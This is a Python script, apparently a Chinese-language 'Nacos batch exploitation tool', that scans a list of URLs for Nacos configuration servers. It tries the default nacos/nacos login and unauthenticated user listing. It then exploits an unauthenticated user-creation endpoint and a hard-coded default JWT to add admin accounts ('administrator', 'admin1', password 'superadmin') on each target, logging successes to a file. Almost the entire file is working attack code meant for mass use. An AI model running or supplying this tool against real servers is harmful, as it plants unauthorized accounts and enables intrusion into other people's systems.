import requests
import urllib3
urllib3.disable_warnings()


head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

def readme():
    print("\n")
    print("& " * 25)
    print("&         漏洞名称：Nacos批量利用工具           &")
    print("&         漏洞描述：批量扫描nacos漏洞           &")
    print("&         Author：霓虹字节-K0u1g              &")
    print("& " * 25)
    print("\n")
def output(outtxt):
    with open('nacosoutput.txt', 'a+') as file:
        file.seek(0, 2)  # 将文件指针移动到末尾
        file.write(outtxt)
def poc1(url):
    print("[poc1] 正在检测是否存在nacos默认口令")
    if url.endswith("/"):
        path1 = "nacos/v1/auth/users/login"
    else:
        path1 = "/nacos/v1/auth/users/login"
    if url.endswith("/"):
        path2 = "v1/auth/users/login"
    else:
        path2 = "/v1/auth/users/login"
    data = {
        "username": "nacos",
        "password": "nacos"
    }
    try:
        checkpoc1 = requests.post(url=url+path1,headers=head,data=data,verify=False)
        checkpoc1_1 = requests.post(url=url+path2,headers=head,data=data,verify=False)
        if checkpoc1.status_code == 200 or checkpoc1_1.status_code == 200:
            print("[+]存在默认口令nacos/nacos")
            outtxt = "默认口令nacos/nacos: " + url + '\n' 
            output(outtxt)
    except requests.exceptions.ConnectionError:
        # 处理连接错误
        print("[-] 连接错误，请检查网络连接或重试")

def poc2(url):
    print("[poc2] 正在检测是否存在未授权查看用户列表漏洞")
    if url.endswith("/"):
        path1 = "nacos/v1/auth/users?pageNo=1&pageSize=5"
    else:
        path1 = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
    if url.endswith("/"):
        path2 = "v1/auth/users?pageNo=1&pageSize=5"
    else:
        path2 = "/v1/auth/users?pageNo=1&pageSize=5"
    try:
        checkpoc2 = requests.get(url=url+path1,headers=head,verify=False)
        checkpoc2_1 = requests.get(url=url+path2,headers=head,verify=False)
        if "username" in checkpoc2.text or "username" in checkpoc2_1.text :
            print(f"[+]存在未授权访问漏洞,你可访问 {url+path1} 查看详细信息")
            outtxt = "未授权访问漏洞: " + url + '\n' 
            output(outtxt)
    except requests.exceptions.ConnectionError:
        # 处理连接错误
        print("[-] 连接错误，请检查网络连接或重试")

def poc3(url):
    print("[poc3] 正在检测是否存在任意用户添加漏洞")
    if url.endswith("/"):
        path1 = "nacos/v1/auth/users"
    else:
        path1 = "/nacos/v1/auth/users"
    if url.endswith("/"):
        path2 = "v1/auth/users"
    else:
        path2 = "/v1/auth/users"
    data = {
        "username": "administrator",
        "password": "superadmin"
    }
    try:
        checkpoc3 = requests.post(url=url + path1, headers=head, data=data, verify=False)
        checkpoc3_1 = requests.post(url=url + path2, headers=head, data=data, verify=False)
        if "create user ok" in checkpoc3.text or "create user ok" in checkpoc3_1.text:
            print("[+]用户:superadmin 添加成功，密码为：superadmin")
            outtxt = "添加用户administrator/superadmin: " + url + '\n' 
            output(outtxt)
    except requests.exceptions.ConnectionError:
        # 处理连接错误
        print("[-] 连接错误，请检查网络连接或重试")


def poc4(url):
    print("[poc4] 正在检测是否存在默认JWT任意用户添加漏洞")
    if url.endswith("/"):
        path1 = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    else:
        path1 = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    if url.endswith("/"):
        path2 = "v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    else:
        path2 = "/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    data = {
        "username": "admin1",
        "password": "superadmin"
    }
    try:
        checkpoc4 = requests.post(url=url + path1, headers=head, data=data, verify=False)
        checkpoc4_1 = requests.post(url=url + path2, headers=head, data=data, verify=False)
        if "create user ok" in checkpoc4.text or "create user ok" in checkpoc4_1.text:
            print("[+]用户:admin1 添加成功，密码为：superadmin")
            outtxt = "添加用户admin1/superadmin: " + url + '\n' 
            output(outtxt)
    except requests.exceptions.ConnectionError:
        # 处理连接错误
        print("[-] 连接错误，请检查网络连接或重试")


if __name__ == '__main__':
    readme()
    filename = input("请输入要批量扫描的文件名:")
    with open(filename, 'r') as file:
        lines = file.readlines()
        for line in lines:
            url = line.strip()
            print("\n[+] 开始检测",url)
            poc1(url)
            poc2(url)
            poc3(url)
            poc4(url)